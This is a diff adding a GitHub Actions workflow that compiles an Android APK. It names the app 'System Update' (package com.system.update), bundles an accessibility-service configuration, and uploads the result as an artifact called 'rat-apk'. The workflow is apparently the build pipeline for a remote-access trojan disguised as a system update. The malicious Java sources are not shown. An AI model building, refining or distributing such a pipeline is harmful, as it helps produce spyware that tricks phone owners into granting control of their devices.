@@ -1,0 +1,107 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Android SDK
+        run: |
+          export ANDROID_HOME=$HOME/android-sdk
+          mkdir -p $ANDROID_HOME/cmdline-tools
+          
+          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip -O cmdline-tools.zip
+          unzip -q cmdline-tools.zip -d $ANDROID_HOME/cmdline-tools
+          mv $ANDROID_HOME/cmdline-tools/cmdline-tools $ANDROID_HOME/cmdline-tools/latest
+          
+          export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
+          
+          yes | sdkmanager --licenses > /dev/null 2>&1 || true
+          sdkmanager "platforms;android-34" "build-tools;34.0.0" > /dev/null 2>&1
+          
+          echo "ANDROID_HOME=$ANDROID_HOME" >> $GITHUB_ENV
+          echo "$ANDROID_HOME/cmdline-tools/latest/bin" >> $GITHUB_PATH
+
+      - name: Setup Project
+        run: |
+          mkdir -p app/src/main/java/com/system/update
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          
+          cp *.java app/src/main/java/com/system/update/ 2>/dev/null || true
+          cp AndroidManifest.xml app/src/main/ 2>/dev/null || true
+          cp accessibility_config.xml app/src/main/res/xml/ 2>/dev/null || true
+          
+          cat > app/src/main/res/values/strings.xml << 'XMLEOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          XMLEOF
+          
+          cat > settings.gradle << 'GRADLEEOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          GRADLEEOF
+          
+          cat > build.gradle << 'GRADLEEOF'
+          plugins {
+              id 'com.android.application' version '8.1.4' apply false
+          }
+          GRADLEEOF
+          
+          cat > gradle.properties << 'GRADLEEOF'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx2048m
+          GRADLEEOF
+          
+          cat > app/build.gradle << 'GRADLEEOF'
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.system.update'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.system.update"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+          dependencies { }
+          GRADLEEOF
+
+      - name: Build APK
+        run: gradle assembleDebug --no-daemon --stacktrace
+
+      - name: Upload APK
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: rat-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+          if-no-files-found: error
